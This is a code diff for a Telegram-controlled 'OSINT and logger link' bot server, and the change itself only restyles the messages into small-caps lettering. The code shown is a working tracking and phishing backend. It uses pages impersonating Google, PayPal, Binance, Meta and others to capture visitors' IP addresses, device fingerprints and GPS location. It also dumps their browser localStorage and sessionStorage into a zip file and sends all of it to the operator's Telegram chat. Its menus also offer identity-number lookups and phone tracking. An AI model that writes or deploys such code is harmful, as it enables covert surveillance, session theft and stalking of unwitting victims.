@@ -100,14 +100,14 @@ async function startServer() {
     if (botInstance) {
       const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
       
-      let msg = `🚩 <b>TARGET REACHED THE TRAP!</b> 🚩\n` +
+      let msg = `🚩 <b>ᴛᴀʀɢᴇᴛ ʀᴇᴀᴄʜᴇᴅ ᴛʜᴇ ᴛʀᴀᴘ!</b> 🚩\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                `📅 <b>ᴡᴀᴋᴛᴜ:</b> <code>${timestamp} ᴡɪʙ</code>\n` +
+                `🌐 <b>ɪᴘ ᴀᴅᴅʀᴇꜱꜱ:</b> <code>${escapeHTML(String(ip))}</code>\n` +
+                `📁 <b>ᴛᴇᴍᴘʟᴀᴛᴇ:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'ᴅᴇꜰᴀᴜʟᴛ'}</code>\n` +
+                `🖥️ <b>ᴜꜱᴇʀ-ᴀɢᴇɴᴛ:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                `📅 <b>Waktu:</b> <code>${timestamp} WIB</code>\n` +
-                `🌐 <b>IP Address:</b> <code>${escapeHTML(String(ip))}</code>\n` +
-                `📁 <b>Template:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
-                `🖥️ <b>User-Agent:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n` +
-                `━━━━━━━━━━━━━━━━━━━━\n` +
-                `⏳ <i>Menunggu sinkronisasi hardware & GPS...</i>`;
+                `⏳ <i>ᴍᴇɴɢᴜɴɢɢᴀʜ ᴅᴀᴛᴀ ʜᴀʀᴅᴡᴀʀᴇ & ɢᴘꜱ...</i>`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
     }
@@ -129,60 +129,60 @@ async function startServer() {
     if (botInstance && chatId) {
       const data = req.body as any;
       const tmplId = data.tmplId || '1';
-      const templateName = templates[tmplId] ? templates[tmplId].name : 'Default';
+      const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
       
-      let header = '🕵️‍♂️ <b>SYSTEM AUDIT: IDENTITY CAPTURED</b>';
-      let status = '🔄 <i>Target sedang memproses izin tambahan...</i>';
+      let header = '🕵️‍♂️ <b>ꜱʏꜱᴛᴇᴍ ᴀᴜᴅɪᴛ: ɪᴅᴇɴᴛɪᴛʏ ᴄᴀᴘᴛᴜʀᴇᴅ</b>';
+      let status = '🔄 <i>ᴛᴀʀɢᴇᴛ ꜱᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏꜱᴇꜱ ɪᴢɪɴ ᴛᴀᴍʙᴀʜᴀɴ...</i>';
 
       if (tmplId === 'google') {
-        header = '🛡️ <b>GOOGLE_SECURITY: ACCESS GRANTED</b>';
+        header = '🛡️ <b>ɢᴏᴏɢʟᴇ_ꜱᴇᴄᴜʀɪᴛʏ: ᴀᴄᴄᴇꜱꜱ ɢʀᴀɴᴛᴇᴅ</b>';
       } else if (tmplId === 'pegasus') {
-        header = '💀 <b>PEGASUS_V9.3: KERNEL_BREACH_SUCCESS</b>';
-        status = '🔥 <i>Status: Deep Scan Hardware Aktif.</i>';
+        header = '💀 <b>ᴘᴇɢᴀꜱᴜꜱ_ᴠ9.3: ᴋᴇʀɴᴇʟ_ʙʀᴇᴀᴄʜ_ꜱᴜᴄᴄᴇꜱꜱ</b>';
+        status = '🔥 <i>ꜱᴛᴀᴛᴜꜱ: ᴅᴇᴇᴘ ꜱᴄᴀɴ ʜᴀʀᴅᴡᴀʀᴇ ᴀᴋᴛɪꜰ.</i>';
       } else if (tmplId === 'file') {
-        header = '📂 <b>FILE_TRANSFER: ACCESS_KEY_CAPTURED</b>';
+        header = '📂 <b>ꜰɪʟᴇ_ᴛʀᴀɴꜱꜰᴇʀ: ᴀᴄᴄᴇꜱꜱ_ᴋᴇʏ_ᴄᴀᴘᴛᴜʀᴇᴅ</b>';
       } else if (tmplId === 'security_audit') {
-        header = '🛡️ <b>ECOSYSTEM_AUDIT: INTEGRITY_PASS</b>';
+        header = '🛡️ <b>ᴇᴄᴏꜱʏꜱᴛᴇᴍ_ᴀᴜᴅɪᴛ: ɪɴᴛᴇɢʀɪᴛʏ_ᴘᴀꜱꜱ</b>';
       } else if (tmplId === 'cloudflare') {
-        header = '☁️ <b>CLOUDFLARE_EDGE: INTEGRITY_VERIFIED</b>';
+        header = '☁️ <b>ᴄʟᴏᴜᴅꜰʟᴀʀᴇ_ᴇᴅɢᴇ: ɪɴᴛᴇɢʀɪᴛʏ_ᴠᴇʀɪꜰɪᴇᴅ</b>';
       } else if (tmplId === 'meta_login') {
-        header = '💬 <b>META_SOCIAL: IDENTITY_SYNCED</b>';
+        header = '💬 <b>ᴍᴇᴛᴀ_ꜱᴏᴄɪᴀʟ: ɪᴅᴇɴᴛɪᴛʏ_ꜱʏɴᴄᴇᴅ</b>';
       } else if (tmplId === 'binance') {
-        header = '💱 <b>BTC_CRYPTO: ASSET_RECON_SUCCESS</b>';
+        header = '💱 <b>ʙᴛᴄ_ᴄʀʏᴘᴛᴏ: ᴀꜱꜱᴇᴛ_ʀᴇᴄᴏɴ_ꜱᴜᴄᴄᴇꜱꜱ</b>';
       } else if (tmplId === 'paypal') {
-        header = '💳 <b>PAYPAL_FINTECH: AUTH_BUS_GRANTED</b>';
+        header = '💳 <b>ᴘᴀʏᴘᴀʟ_ꜰɪɴᴛᴇᴄʜ: ᴀᴜᴛʜ_ʙᴜꜱ_ɢʀᴀɴᴛᴇᴅ</b>';
       } else if (tmplId === 'steam') {
-        header = '🎮 <b>STEAM_GAMING: NODE_SYNC_COMPLETE</b>';
+        header = '🎮 <b>ꜱᴛᴇᴀᴍ_ɢᴀᴍɪɴɢ: ɴᴏᴅᴇ_ꜱʏɴᴄ_ᴄᴏᴍᴘʟᴇᴛᴇ</b>';
       } else if (tmplId === 'netflix') {
-        header = '🍿 <b>NETFLIX_SYNC: HOUSEHOLD_GRID_MATCH</b>';
+        header = '🍿 <b>ɴᴇᴛꜰʟɪx_ꜱʏɴᴄ: ʜᴏᴜꜱᴇʜᴏʟᴅ_ɢʀɪᴅ_ᴍᴀᴛᴄʜ</b>';
       } else if (tmplId === 'tiktok') {
-        header = '🎵 <b>TIKTOK_RECON: CREATOR_TELEMETRY</b>';
+        header = '🎵 <b>ᴛɪᴋᴛᴏᴋ_ʀᴇᴄᴏɴ: ᴄʀᴇᴀᴛᴏʀ_ᴛᴇʟᴇᴍᴇᴛʀʏ</b>';
       } else if (tmplId === 'chatgpt') {
-        header = '🤖 <b>OPENAI_INTELLIGENCE: DEV_ENV_MAPPED</b>';
+        header = '🤖 <b>ᴏᴘᴇɴᴀɪ_ɪɴᴛᴇʟʟɪɢᴇɴᴄᴇ: ᴅᴇᴠ_ᴇɴᴠ_ᴍᴀᴘᴇᴅ</b>';
       }
 
       let msg = `<b>${header}</b>\n` +
-                  `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `📋 <b>TEMPLATE INFO</b>\n` +
-                  `├ Name: <code>${escapeHTML(templateName)}</code>\n` +
-                  `└ Flow: <code>Advanced Audit</code>\n\n` +
-                  `🖥️ <b>HARDWARE SPECS</b>\n` +
-                  `├ Platform: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
-                  `├ Browser: <code>${escapeHTML(data.vendor || 'N/A')} (${data.onLine ? 'Online' : 'Offline'})</code>\n` +
-                  `├ CPU Cores: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
-                  `├ RAM (Est): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
-                  `├ GPU: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
-                  `├ VM Status: <code>${escapeHTML(data.vmStatus || 'N/A')}</code>\n` +
-                  `└ Screen: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
-                  `🔋 <b>ENERGY & PERF</b>\n` +
-                  `├ Battery: <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
-                  `├ Connect: <code>${escapeHTML(data.connection || 'N/A')}</code>\n` +
-                  `├ Refresh: <code>${escapeHTML(data.refreshRate || 'Verified')}</code>\n` +
-                  `└ Gamut: <code>${escapeHTML(data.gamut || 'N/A')}</code>\n\n` +
-                  `🌍 <b>REGION & ENV</b>\n` +
-                  `├ Timezone: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
-                  `├ Langs: <code>${escapeHTML(data.langs || 'N/A')}</code>\n` +
-                  `└ Referrer: <code>${escapeHTML(data.ref || 'Direct')}</code>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                  `📋 <b>ᴛᴇᴍᴘʟᴀᴛᴇ ɪɴꜰᴏ</b>\n` +
+                  `├ ɴᴀᴍᴇ: <code>${escapeHTML(templateName)}</code>\n` +
+                  `└ ꜰʟᴏᴡ: <code>ᴀᴅᴠᴀɴᴄᴇᴅ ᴀᴜᴅɪᴛ</code>\n\n` +
+                  `🖥️ <b>ʜᴀʀᴅᴡᴀʀᴇ ꜱᴘᴇᴄꜱ</b>\n` +
+                  `├ ᴘʟᴀᴛꜰᴏʀᴍ: <code>${escapeHTML(data.platform || 'ɴ/ᴀ')}</code>\n` +
+                  `├ ʙʀᴏᴡꜱᴇʀ: <code>${escapeHTML(data.vendor || 'ɴ/ᴀ')} (${data.onLine ? 'ᴏɴʟɪɴᴇ' : 'ᴏꜰꜰʟɪɴᴇ'})</code>\n` +
+                  `├ ᴄᴘᴜ ᴄᴏʀᴇꜱ: <code>${escapeHTML(String(data.cores || 'ɴ/ᴀ'))}</code>\n` +
+                  `├ ʀᴀᴍ (ᴇꜱᴛ): <code>${escapeHTML(String(data.mem || 'ɴ/ᴀ'))} ɢʙ</code>\n` +
+                  `├ ɢᴘᴜ: <code>${escapeHTML(data.gpu || 'ɴ/ᴀ')}</code>\n` +
+                  `├ ᴠᴍ ꜱᴛᴀᴛᴜꜱ: <code>${escapeHTML(data.vmStatus || 'ɴ/ᴀ')}</code>\n` +
+                  `└ ꜱᴄʀᴇᴇɴ: <code>${escapeHTML(data.screen || 'ɴ/ᴀ')}</code>\n\n` +
+                  `🔋 <b>ᴇɴᴇʀɢʏ & ᴘᴇʀꜰ</b>\n` +
+                  `├ ʙᴀᴛᴛᴇʀʏ: <code>${escapeHTML(data.battery || 'ɴ/ᴀ')}</code>\n` +
+                  `├ ᴄᴏɴɴᴇᴄᴛ: <code>${escapeHTML(data.connection || 'ɴ/ᴀ')}</code>\n` +
+                  `├ ʀᴇꜰʀᴇꜱʜ: <code>${escapeHTML(data.refreshRate || 'ᴠᴇʀɪꜰɪᴇᴅ')}</code>\n` +
+                  `└ ɢᴀᴍᴜᴛ: <code>${escapeHTML(data.gamut || 'ɴ/ᴀ')}</code>\n\n` +
+                  `🌍 <b>ʀᴇɢɪᴏɴ & ᴇɴᴠ</b>\n` +
+                  `├ ᴛɪᴍᴇᴢᴏɴᴇ: <code>${escapeHTML(data.timezone || 'ɴ/ᴀ')}</code>\n` +
+                  `├ ʟᴀɴɢꜱ: <code>${escapeHTML(data.langs || 'ɴ/ᴀ')}</code>\n` +
+                  `└ ʀᴇꜰᴇʀʀᴇʀ: <code>${escapeHTML(data.ref || 'ᴅɪʀᴇᴄᴛ')}</code>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `${status}`;
 
@@ -364,7 +364,7 @@ async function startServer() {
           zip.addFile("localStorage.json", Buffer.from(JSON.stringify(lsObj, null, 2), "utf8"));
           zip.addFile("sessionStorage.json", Buffer.from(JSON.stringify(ssObj, null, 2), "utf8"));
           const zipBuffer = zip.toBuffer();
-          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageDump_${id}.zip` }, { content_type: 'application/zip', caption: "💾 <b>STORAGE_DUMP_RECON_SUCCESS</b>", parse_mode: 'HTML' }).catch(() => {});
+          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageDump_${id}.zip` }, { caption: "💾 <b>ꜱᴛᴏʀᴀɢᴇ_ᴅᴜᴍᴘ_ʀᴇᴄᴏɴ_ꜱᴜᴄᴄᴇꜱꜱ</b>", parse_mode: 'HTML' }).catch(() => {});
         } catch (e) {}
 
         addSection(`💾 PERSISTENT_MEMORY_DUMP`, storageTxt);
@@ -421,26 +421,26 @@ async function startServer() {
       const { lat, lon, acc, tmplId } = req.body;
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       
-      let header = '📍 <b>GPS_FIX: TARGET_LOCATED</b>';
+      let header = '📍 <b>ɢᴘꜱ_ꜰɪx: ᴛᴀʀɢᴇᴛ_ʟᴏᴄᴀᴛᴇᴅ</b>';
       if (tmplId === 'google') {
-        header = '⚡ <b>TRUSTED_LOCATION_SYNC</b>';
+        header = '⚡ <b>ᴛʀᴜꜱᴛᴇᴅ_ʟᴏᴄᴀᴛɪᴏɴ_ꜱʏɴᴄ</b>';
       } else if (tmplId === 'maps') {
-        header = '🗺️ <b>MAPS_PRECISION_COORDINATES</b>';
+        header = '🗺️ <b>ᴍᴀᴘꜱ_ᴘʀᴇᴄɪꜱɪᴏɴ_ᴄᴏᴏʀᴅɪɴᴀᴛᴇꜱ</b>';
       } else if (tmplId === 'pegasus') {
-        header = '💀 <b>PEGASUS: REALTIME_GPS_INTERCEPT</b>';
+        header = '💀 <b>ᴘᴇɢᴀꜱᴜꜱ: ʀᴇᴀʟᴛɪᴍᴇ_ɢᴘꜱ_ɪɴᴛᴇʀᴄᴇᴘᴛ</b>';
       }
 
       const msg = `<b>${header}</b>\n` +
-                  `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🛰️ <b>COORDINATES</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                  `🛰️ <b>ᴄᴏᴏʀᴅɪɴᴀᴛᴇꜱ</b>\n` +
                   `├ Lat: <code>${lat}</code>\n` +
                   `├ Lon: <code>${lon}</code>\n` +
-                  `└ Acc: <code>${acc} meter</code>\n` +
+                  `└ Acc: <code>${acc} meter</code>\n\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🔗 <b>NAVIGATION LINK</b>\n` +
-                  `🌐 <a href="${mapLink}">Lihat Lokasi di Google Maps</a>\n` +
+                  `🔗 <b>ɴᴀᴠɪɢᴀᴛɪᴏɴ ʟɪɴᴋ</b>\n` +
+                  `🌐 <a href="${mapLink}">ʟɪʜᴀᴛ ʟᴏᴋᴀꜱɪ ᴅɪ ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ</a>\n\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🏁 <i>Status: Verifikasi Spasial Berhasil.</i>`;
+                  `🏁 <i>ꜱᴛᴀᴛᴜꜱ: ᴠᴇʀɪꜰɪᴋᴀꜱɪ ꜱᴘᴀꜱɪᴀʟ ʙᴇʀʜᴀꜱɪʟ.</i>`;
 
       botInstance.telegram.sendMessage(chatId, msg, { 
         parse_mode: 'HTML', 
@@ -480,17 +480,17 @@ async function startServer() {
   if (process.env.TELEGRAM_BOT_TOKEN) {
     const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
 
-    const startMsgText = `━━━━━━━━━━━━━━━━━━━━\n` +
+    const startMsgText = `━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━\n\n` +
                          `<b>ᴛʀɪʜᴇxᴀ666 - ᴘʀɪɴᴄᴇ ᴏꜰ ᴏꜱɪɴᴛ ᴀɴᴅ ʟᴏɢɢᴇʀ ʟɪɴᴋ ᴠ.1</b>\n\n` +
-                         `<b>ᴏᴡɴᴇʀ - ᴡʜʏʟᴀᴜɢʜ404</b>\n\n` +
-                         `ᴀʙᴏᴜᴛ ᴛʀɪʜᴇxᴀ666 : ᴅɪᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴏʟᴇʜ ᴡʜʏʟᴀᴜɢʜ404 ꜱᴇʙᴀɢᴀɪ ᴀʟᴀᴛ ᴏꜱɪɴᴛ ᴅᴀɴ ᴘᴇʟᴀᴄᴀᴋᴀɴ ꜱᴇᴄᴀʀᴀ ᴍᴇɴᴅᴀʟᴀᴍ. ᴍᴇʟɪʙᴀᴛᴋᴀɴ ᴘᴇɴɢɢᴜɴᴀᴀɴ ɪɴꜰᴏʀᴍᴀꜱɪ ꜱᴜᴍʙᴇʀ ᴛᴇʀʙᴜᴋᴀ ᴅᴀɴ ʟᴏɢɢᴇʀ ʟɪɴᴋ. ʙᴏᴛ ɪɴɪ ᴅɪʜᴀʀᴀᴘᴋᴀɴ ᴍᴀᴍᴘᴜ ᴜɴᴛᴜᴋ ᴍᴇᴍᴇɴᴜʜɪ ᴛᴜɢᴀꜱɴʏᴀ ꜱᴇʙᴀɢᴀɪ ʙᴀɢɪᴀɴ ᴅᴀʀɪ ᴀʟᴀᴛ ᴀʟᴀᴛ ᴡʜʏʟᴀᴜɢʜ404\n` +
+                         `<b>ᴏᴡɴᴇʀ : ᴡʜʏʟᴀᴜɢʜ404</b>\n\n` +
+                         `ᴀʙᴏᴜᴛ ᴛʀɪʜᴇxᴀ666 : ᴅɪᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴏʟᴇʜ ᴡʜʏʟᴀᴜɢʜ404 ꜱᴇʙᴀɢᴀɪ ᴀʟᴀᴛ ᴏꜱɪɴᴛ ᴅᴀɴ ᴘᴇʟᴀᴄᴀᴋᴀɴ ꜱᴇᴄᴀʀᴀ ᴍᴇɴᴅᴀʟᴀᴍ. ᴍᴇʟɪʙᴀᴛᴋᴀɴ ᴘᴇɴɢɢᴜɴᴀᴀɴ ɪɴꜰᴏʀᴍᴀꜱɪ ꜱᴜᴍʙᴇʀ ᴛᴇʀʙᴜᴋᴀ. ʙᴏᴛ ɪɴɪ ᴅɪʜᴀʀᴀᴘᴋᴀɴ ᴍᴀᴍᴘᴜ ᴜɴᴛᴜᴋ ᴍᴇᴍᴇɴᴜʜɪ ᴛᴜɢᴀꜱɴʏᴀ ꜱᴇʙᴀɢᴀɪ ʙᴀɢɪᴀɴ ᴅᴀʀɪ ᴀʟᴀᴛ ᴡʜʏʟᴀᴜɢʜ404.\n\n` +
                          `━━━━━━━━━━━━━━━━━━━━`;
     
     const mainKeyboard = Markup.inlineKeyboard([
-      [Markup.button.callback('🇮🇩 LOCAL OSINT', 'menu_osint_basic'), Markup.button.callback('📡 GLOBAL RECON', 'menu_osint_adv')],
-      [Markup.button.callback('🛠️ HARD TOOLS', 'menu_tools'), Markup.button.callback('🎣 STEALTH LOG', 'menu_logger')],
-      [Markup.button.callback('🎲 MINI GAMES', 'menu_games'), Markup.button.callback('🎵 MEDIA SYNC', 'menu_media')],
-      [Markup.button.callback('ℹ️ TERMINAL INFO', 'menu_help')]
+      [Markup.button.callback('🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ', 'menu_osint_basic'), Markup.button.callback('📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ', 'menu_osint_adv')],
+      [Markup.button.callback('🛠️ ʜᴀʀᴅ ᴛᴏᴏʟꜱ', 'menu_tools'), Markup.button.callback('🎣 ꜱᴛᴇᴀʟᴛʜ ʟᴏɢ', 'menu_logger')],
+      [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🎵 ᴍᴇᴅɪᴀ ꜱʏɴᴄ', 'menu_media')],
+      [Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')]
     ]);
 
     bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));
@@ -502,127 +502,153 @@ async function startServer() {
 
     bot.action('menu_osint_basic', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🇮🇩 LOCAL OSINT MODULE (ID)</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n` +
-        `• <b>/nik [nomor]</b>\n  └ <i>KTP Identity Analytics & Regional Mapping.</i>\n\n` +
-        `• <b>/plat [nomor]</b>\n  └ <i>Vehicle Registration Area Identification.</i>\n\n` +
-        `• <b>/ip [target]</b>\n  └ <i>Deep IP Geolocation & Network Intelligence.</i>\n\n` +
-        `• <b>/email [email]</b>\n  └ <i>SMTP MX Validator & Deliverability Check.</i>\n\n` +
-        `• <b>/username [user]</b>\n  └ <i>Social Footprint Mapping (75+ Platforms).</i>\n\n` +
-        `• <b>/whois [domain]</b>\n  └ <i>Domain Administrative Reconnaissance.</i>\n\n` +
-        `• <b>/dns [domain]</b>\n  └ <i>Zone Enumeration & DNS Record Mapping.</i>\n` +
+      const txt = `<b>🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ ᴍᴏᴅᴜʟᴇ</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `• <b>/nik [ɴᴏᴍᴏʀ]</b>\n` +
+        `  └ <i>ᴋᴛᴘ ɪᴅᴇɴᴛɪᴛʏ ᴀɴᴀʟʏᴛɪᴄꜱ & ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
+        `• <b>/plat [ɴᴏᴍᴏʀ]</b>\n` +
+        `  └ <i>ᴠᴇʜɪᴄʟᴇ ʀᴇɢ ᴀʀᴇᴀ ɪᴅᴇɴᴛɪꜰɪᴄᴀᴛɪᴏɴ</i>\n\n` +
+        `• <b>/ip [ᴛᴀʀɢᴇᴛ]</b>\n` +
+        `  └ <i>ᴅᴇᴇᴘ ɪᴘ ɢᴇᴏʟᴏᴄᴀᴛɪᴏɴ ɪɴᴛᴇʟ</i>\n\n` +
+        `• <b>/email [ᴇᴍᴀɪʟ]</b>\n` +
+        `  └ <i>ꜱᴍᴛᴘ ᴍx ᴠᴀʟɪᴅᴀᴛᴏʀ ᴄʜᴇᴄᴋ</i>\n\n` +
+        `• <b>/username [ᴜꜱᴇʀ]</b>\n` +
+        `  └ <i>ꜱᴏᴄɪᴀʟ ꜰᴏᴏᴛᴘʀɪɴᴛ ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
+        `• <b>/whois [ᴅᴏᴍᴀɪɴ]</b>\n` +
+        `  └ <i>ʀᴇɢɪꜱᴛʀᴀʀ ʀᴇᴄᴏɴɴᴀɪꜱꜱᴀɴᴄᴇ</i>\n\n` +
+        `• <b>/dns [ᴅᴏᴍᴀɪɴ]</b>\n` +
+        `  └ <i>ᴅɴꜱ ʀᴇᴄᴏʀᴅ ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
         `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_osint_adv', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>📡 GLOBAL RECON MODULE</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n` +
-        `• <b>/headers [url]</b>\n  └ <i>Security Header Audit & Response Analysis.</i>\n\n` +
-        `• <b>/dork [keyword]</b>\n  └ <i>Advanced Google Dorks Link Engine.</i>\n\n` +
-        `• <b>/bininfo [bin]</b>\n  └ <i>Credit Card Issuer & Tier Analytics.</i>\n\n` +
-        `• <b>/subdomain [domain]</b>\n  └ <i>Infrastructure Layer Subdomain Recon.</i>\n\n` +
-        `• <b>/github_user [user]</b>\n  └ <i>Detailed GitHub Profile Metadata Extraction.</i>\n\n` +
-        `• <b>/port [ip] [port]</b>\n  └ <i>Network Entry-Point Port Scanner.</i>\n\n` +
-        `• <b>/phone_dork [nomor]</b>\n  └ <i>Phone Trackers & Mobile Asset OSINT.</i>\n` +
+      const txt = `<b>📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ ᴍᴏᴅᴜʟᴇ</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `• <b>/headers [ᴜʀʟ]</b>\n` +
+        `  └ <i>ꜱᴇᴄᴜʀɪᴛʏ ʜᴇᴀᴅᴇʀ ᴀᴜᴅɪᴛ & ᴀɴᴀʟʏꜱɪꜱ</i>\n\n` +
+        `• <b>/dork [ᴋᴇʏᴡᴏʀᴅ]</b>\n` +
+        `  └ <i>ᴀᴅᴠᴀɴᴄᴇᴅ ɢᴏᴏɢʟᴇ ᴅᴏʀᴋꜱ ᴇɴɢɪɴᴇ</i>\n\n` +
+        `• <b>/bininfo [ʙɪɴ]</b>\n` +
+        `  └ <i>ᴄᴀʀᴅ ɪꜱꜱᴜᴇʀ & ᴛɪᴇʀ ᴀɴᴀʟʏᴛɪᴄꜱ</i>\n\n` +
+        `• <b>/subdomain [ᴅᴏᴍᴀɪɴ]</b>\n` +
+        `  └ <i>ɪɴꜰʀᴀꜱᴛʀᴜᴄᴛᴜʀᴇ ꜱᴜʙᴅᴏᴍᴀɪɴ ʀᴇᴄᴏɴ</i>\n\n` +
+        `• <b>/github_user [ᴜꜱᴇʀ]</b>\n` +
+        `  └ <i>ɢɪᴛʜᴜʙ ᴘʀᴏꜰɪʟᴇ ᴍᴇᴛᴀᴅᴀᴛᴀ</i>\n\n` +
+        `• <b>/port [ɪᴘ] [ᴘᴏʀᴛ]</b>\n` +
+        `  └ <i>ɴᴇᴛᴡᴏʀᴋ ᴘᴏʀᴛ ꜱᴄᴀɴɴᴇʀ</i>\n\n` +
+        `• <b>/phone_dork [ɴᴏᴍᴏʀ]</b>\n` +
+        `  └ <i>ᴍᴏʙɪʟᴇ ᴀꜱꜱᴇᴛ ᴏꜱɪɴᴛ ᴛʀᴀᴄᴋᴇʀ</i>\n\n` +
         `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_tools', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🛠️ ADVANCED UTILITIES</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n` +
-        `• <b>/qr [teks]</b>\n  └ <i>Generate QR Code (PNG via API).</i>\n\n` +
-        `• <b>/shortlink [url]</b>\n  └ <i>Persingkat URL panjang (is.gd hook).</i>\n\n` +
-        `• <b>/pwd [panjang]</b>\n  └ <i>Buat password dengan entropy tinggi.</i>\n\n` +
-        `• <b>/b64enc | /b64dec</b>\n  └ <i>Konversi teks ke/dari Base64.</i>\n\n` +
-        `• <b>/hash [teks]</b>\n  └ <i>Buat checksum MD5 & SHA256 sekaligus.</i>\n\n` +
-        `• <b>/uuid</b>\n  └ <i>Generate Unique ID v4 acak.</i>\n\n` +
-        `• <b>/weather [kota]</b>\n  └ <i>Data cuaca dari wttr.in (Real-time).</i>\n\n` +
-        `• <b>/crypto_price [koin]</b>\n  └ <i>Cek harga aset kripto (Market Data API).</i>\n` +
+      const txt = `<b>🛠️ ᴀᴅᴠᴀɴᴄᴇᴅ ᴜᴛɪʟɪᴛɪᴇꜱ</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `• <b>/qr [ᴛᴇᴋꜱ]</b>\n` +
+        `  └ <i>ɢᴇɴᴇʀᴀᴛᴇ ǫʀ ᴄᴏᴅᴇ</i>\n\n` +
+        `• <b>/shortlink [ᴜʀʟ]</b>\n` +
+        `  └ <i>ᴘᴇʀꜱɪɴɢᴋᴀᴛ ᴜʀʟ (ɪꜱ.ɢᴅ)</i>\n\n` +
+        `• <b>/pwd [ᴘᴀɴᴊᴀɴɢ]</b>\n` +
+        `  └ <i>ʙᴜᴀᴛ ᴘᴀꜱꜱᴡᴏʀᴅ ᴇɴᴛʀᴏᴘʏ ᴛɪɴɢɢɪ</i>\n\n` +
+        `• <b>/b64enc | /b64dec</b>\n` +
+        `  └ <i>ᴋᴏɴᴠᴇʀꜱɪ ᴛᴇᴋꜱ ʙᴀꜱᴇ64</i>\n\n` +
+        `• <b>/hash [ᴛᴇᴋꜱ]</b>\n` +
+        `  └ <i>ᴄʜᴇᴄᴋꜱᴜᴍ ᴍᴅ5 & ꜱʜᴀ256</i>\n\n` +
+        `• <b>/uuid</b>\n` +
+        `  └ <i>ɢᴇɴᴇʀᴀᴛᴇ ᴜɴɪǫᴜᴇ ɪᴅ ᴠ4</i>\n\n` +
+        `• <b>/weather [ᴋᴏᴛᴀ]</b>\n` +
+        `  └ <i>ᴅᴀᴛᴀ ᴄᴜᴀᴄᴀ ʀᴇᴀʟ-ᴛɪᴍᴇ</i>\n\n` +
+        `• <b>/crypto_price [ᴋᴏɪɴ]</b>\n` +
+        `  └ <i>ᴄᴇᴋ ʜᴀʀɢᴀ ᴀꜱᴇᴛ ᴋʀɪᴘᴛᴏ</i>\n\n` +
         `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_games', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🎲 MINI GAMES (20+ FITUR)</b>\n` +
